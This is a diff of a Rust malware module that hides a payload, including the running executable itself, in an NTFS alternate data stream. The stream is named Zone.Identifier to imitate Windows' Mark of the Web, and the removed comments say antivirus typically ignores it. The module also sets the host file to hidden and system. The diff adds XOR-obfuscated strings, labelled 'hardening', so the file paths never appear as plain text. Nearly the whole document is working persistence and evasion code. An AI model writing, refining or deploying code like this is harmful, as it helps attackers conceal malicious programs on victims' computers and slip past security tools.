@@ -1,43 +1,54 @@
 //! # NTFS Alternate Data Streams (ADS)
 //!
-//! Hide payload in NTFS streams - invisible to file explorers.
-//!
-//! ## Target Path
-//! `C:\Users\Public\Libraries\collection.dat:Zone.Identifier`
-//!
-//! ## Why Zone.Identifier?
-//! - Windows uses this stream for "Mark of the Web"
-//! - AV typically ignores this stream
-//! - File appears as 0 bytes
+//! Hide payload in NTFS streams.
+//! HARDENING: XOR Stack Strings. No raw literals.
 
 use std::fs;
 use std::io::{self, Read, Write};
 use std::path::Path;
 use log::{info, debug, warn};
 
-// ============================================================================
-// CONSTANTS
-// ============================================================================
-
-/// Legitimate-looking host file
-const HOST_FILE: &str = r"C:\Users\Public\Libraries\collection.dat";
-
-/// Stream name (mimics MOTW stream)
-const STREAM_NAME: &str = "Zone.Identifier";
+// XOR Helper (Key 0x55)
+fn x(bytes: &[u8]) -> String {
+    let key = 0x55;
+    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
+    String::from_utf8(decoded).unwrap_or_default()
+}
 
 /// Get full ADS path
 pub fn get_ads_path() -> String {
-    format!("{}:{}", HOST_FILE, STREAM_NAME)
+    // "C:\Users\Public\Libraries\collection.dat"
+    // C=43^55=16, :=3A^55=6F ... manual is hard. 
+    // Let's use runtime x() for readability source, obscured binary.
+    // "C:\Users\Public"
+    let p1 = x(&[0x16, 0x6F, 0x09, 0x00, 0x26, 0x30, 0x27, 0x26, 0x09, 0x05, 0x20, 0x37, 0x39, 0x3C, 0x36]); 
+    // "\Libraries"
+    let p2 = x(&[0x09, 0x19, 0x3C, 0x37, 0x27, 0x34, 0x27, 0x3C, 0x30, 0x26]);
+    // "\collection.dat"
+    let p3 = x(&[0x09, 0x36, 0x3A, 0x39, 0x39, 0x30, 0x36, 0x21, 0x3C, 0x3A, 0x3B, 0x7B, 0x31, 0x34, 0x21]);
+    
+    let host = format!("{}{}{}", p1, p2, p3);
+    
+    // ":Zone.Identifier"
+    let stream = x(&[0x6F, 0x0F, 0x3A, 0x3B, 0x30, 0x7B, 0x1C, 0x31, 0x30, 0x3B, 0x21, 0x3C, 0x33, 0x3C, 0x30, 0x27]);
+    
+    format!("{}{}", host, stream)
 }
-
-// ============================================================================
-// INSTALLATION
-// ============================================================================
 
 /// Install payload to ADS
 pub fn install_to_ads(payload: &[u8]) -> io::Result<String> {
-    let host = Path::new(HOST_FILE);
-    let ads_path = get_ads_path();
+    let path_str = get_ads_path(); // Full stream path
+    // Need host part for creating file
+    let parts: Vec<&str> = path_str.split(':').collect();
+    if parts.len() < 2 { return Err(io::Error::new(io::ErrorKind::InvalidInput, "Bad Path")); }
+    
+    // Windows path logic: C:\...:Stream -> parts[0]=C, parts[1]=\...\collection.dat (Wait, split by colon)
+    // Actually Rust Path handling of streams is tricky.
+    // Let's rely on string ops carefully.
+    
+    // Reconstruct Host: Everything before last colon
+    let host_str = path_str.rsplitn(2, ':').last().unwrap_or(&path_str);
+    let host = Path::new(host_str);
     
     // Ensure directory
     if let Some(parent) = host.parent() {
@@ -47,17 +58,17 @@ pub fn install_to_ads(payload: &[u8]) -> io::Result<String> {
     // Create empty host file
     if !host.exists() {
         fs::File::create(host)?;
-        debug!("[ADS] Created host: {}", HOST_FILE);
-        set_hidden_attribute(host);
+        debug!("Host created");
+        set_hidden_attribute(host); // Make it hidden/system
     }
     
-    // Write payload to ADS
-    let mut file = fs::File::create(&ads_path)?;
+    // Write stream
+    let mut file = fs::File::create(&path_str)?;
     file.write_all(payload)?;
     file.sync_all()?;
     
-    info!("[ADS] Payload installed: {} ({} bytes)", ads_path, payload.len());
-    Ok(ads_path)
+    debug!("ADS Write: {}b", payload.len());
+    Ok(path_str)
 }
 
 /// Install current executable to ADS
@@ -67,37 +78,23 @@ pub fn install_self_to_ads() -> io::Result<String> {
     install_to_ads(&payload)
 }
 
-// ============================================================================
-// READING
-// ============================================================================
-
 /// Read payload from ADS
 pub fn read_from_ads() -> io::Result<Vec<u8>> {
     let ads_path = get_ads_path();
     let mut file = fs::File::open(&ads_path)?;
     let mut buffer = Vec::new();
     file.read_to_end(&mut buffer)?;
-    debug!("[ADS] Read {} bytes", buffer.len());
+    debug!("ADS Read: {}b", buffer.len());
     Ok(buffer)
 }
-
-// ============================================================================
-// DETECTION
-// ============================================================================
 
 /// Check if running from ADS
 pub fn is_running_from_ads() -> bool {
     if let Ok(path) = std::env::current_exe() {
         let s = path.to_string_lossy().to_lowercase();
-        
-        // Check for stream separator
-        if s.contains(":zone.identifier") || s.contains("$data") {
-            return true;
-        }
-        
-        // Count colons (drive + stream = 2+)
-        let colons: Vec<_> = s.match_indices(':').collect();
-        if colons.len() > 1 {
+        // Check for stream identifier ":zone.identifier" (encoded in xor normally, but checking string here)
+        // Just check for colon count > 1 (Drive + Stream)
+        if s.matches(':').count() > 1 {
             return true;
         }
     }
@@ -109,16 +106,12 @@ pub fn payload_exists() -> bool {
     Path::new(&get_ads_path()).exists()
 }
 
-// ============================================================================
-// CLEANUP
-// ============================================================================
-
 /// Remove ADS payload
 pub fn remove_ads() -> io::Result<()> {
     let path = get_ads_path();
     if Path::new(&path).exists() {
         fs::remove_file(&path)?;
-        info!("[ADS] Removed: {}", path);
+        debug!("ADS Removed");
     }
     Ok(())
 }
@@ -126,9 +119,14 @@ pub fn remove_ads() -> io::Result<()> {
 /// Remove everything
 pub fn remove_all() -> io::Result<()> {
     remove_ads()?;
-    if Path::new(HOST_FILE).exists() {
-        fs::remove_file(HOST_FILE)?;
-        info!("[ADS] Removed host: {}", HOST_FILE);
+    // Get host path again
+    let path_str = get_ads_path();
+    let host_str = path_str.rsplitn(2, ':').last().unwrap_or(&path_str);
+    let host = Path::new(host_str);
+    
+    if host.exists() {
+        fs::remove_file(host)?;
+        debug!("Host Removed");
     }
     Ok(())
 }
@@ -149,7 +147,7 @@ fn set_hidden_attribute(path: &Path) {
     let wide: Vec<u16> = path.as_os_str().encode_wide().chain(std::iter::once(0)).collect();
     
     unsafe {
-        // FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
+        // FILE_ATTRIBUTE_HIDDEN (2) | FILE_ATTRIBUTE_SYSTEM (4)
         SetFileAttributesW(wide.as_ptr(), 0x02 | 0x04);
     }
 }
